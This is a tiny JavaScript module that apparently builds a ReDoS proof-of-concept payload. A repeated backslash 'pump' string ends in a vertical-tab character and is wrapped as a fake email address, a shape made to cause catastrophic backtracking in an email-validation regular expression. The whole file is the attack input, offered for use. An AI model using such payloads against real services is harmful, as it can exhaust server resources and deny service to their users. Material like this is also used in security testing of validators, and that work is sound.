function getPayload() {
  const pump = "\\\\a\\\\\\a";
  var attackString = "";
  for (var i = 0; i < 9; i++) {
    attackString += pump;
  }
  attackString += "\x0B";
  var badEmail = `${attackString}@google.com`;

  return { badEmail };
}

module.exports = { getPayload };